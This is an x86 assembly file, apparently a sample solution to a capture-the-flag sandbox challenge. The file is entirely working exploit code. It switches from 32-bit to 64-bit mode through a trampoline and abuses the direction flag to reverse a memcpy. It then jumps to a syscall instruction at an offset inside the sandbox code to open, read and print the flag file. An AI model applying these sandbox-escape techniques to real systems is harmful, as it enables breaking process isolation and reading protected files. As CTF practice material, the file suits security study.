;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;; Sample 32-bit user code that exploits the challenge.
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

	BITS 32

	mov	esp, 0xbeef2800
	sub	esp, 4

	push 0x00000000
	push 0xdead0000 + done ; return address
	push 0x00000000
	push 0x67616c66

	;; kernel arguments
	mov	edi, 2		; __NR_open
	mov	esi, esp	; file name
	mov	edx, 0		; flags
	mov	ecx, 0		; mode

	;; jmp to trampoline 64-bit kernel
	;; not straightforward because of restricted characters
	push 0
	mov	eax, 0xdead0000 + done
	push	eax


	xor	eax, eax	;; mov  eax, 0xfffff000
	dec	eax
	shl	eax, 12

	; change the direction of memcpy (rep)
	std

	push eax
	ret

failed:
	xor eax, eax
	mov eax, [eax]

done:
	BITS 64

	; running 64 bit code here :-)

	mov rbx, rsi
	sub rbx, 0x436 ; offset to syscall instruction in sandbox code

	xor rax, rax
	mov edi, 2

	xor rdx, rdx
	xor rcx, rcx
	
	mov r15d, 0x0dead0000 + read_file
	push r15
	push r15

	push rbx ; syscall(__NR_open, "flag", 0)
	ret

read_file:
	
	xor rax, rax
	mov edi, 0
	mov rsi, 3

	mov rdx, rsp
	mov rcx, 0x400
	
	mov r15d, 0x0dead0000 + writing_file
	push r15
	push r15

	push rbx ; syscall(__NR_read, rsp, 0x400)
	ret

writing_file:

	; write the flag to stdout
	xor rax, rax
	mov edi, 1
	mov rsi, 1

	mov rdx, rsp
	mov rcx, 0x40
	
	mov r15d, 0x0dead0000 + read_file
	push r15
	push r15

	push rbx ; syscall(__NR_write, rsp, 0x40)
	ret

	; looping to force the server to flush the flag file :-)
	jmp writing_file


